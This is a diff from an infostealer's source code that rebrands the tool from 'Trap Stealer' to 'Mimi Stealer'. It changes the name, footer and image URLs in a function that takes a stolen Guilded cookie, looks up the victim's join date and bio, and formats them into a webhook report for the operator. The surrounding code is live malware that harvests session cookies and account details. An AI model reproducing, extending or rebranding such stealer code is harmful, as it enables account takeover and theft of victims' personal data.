@@ -2915,8 +2915,8 @@ def guilded(cookie):
         join = response["user"]["joinDate"] if response["user"]["joinDate"] else "Couldn't get join date"
         bio = response["user"]["aboutInfo"]["tagLine"] if response["user"]["aboutInfo"]["tagLine"] else "Couldn't get user bio"
         data = {
-                "username": "Trap Stealer",
-                "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+                "username": "Mimi Stealer",
+                "avatar_url": "https://i.pinimg.com/736x/61/6c/5a/616c5ae0f1205a55b18d7deddeac09ac.jpg",
                 "content": "",
                 "embeds": [
                     {
@@ -2928,11 +2928,11 @@ def guilded(cookie):
                             "icon_url": 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
                         },
                         "footer": {
-                            "text": "Trap Stealer",
+                            "text": "Mimi Stealer",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         },
                         "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                            "url": "https://media1.tenor.com/m/f2wtdJ3UHR0AAAAC/mimi-typh.gif"
                         },
                         "fields": [
                             {
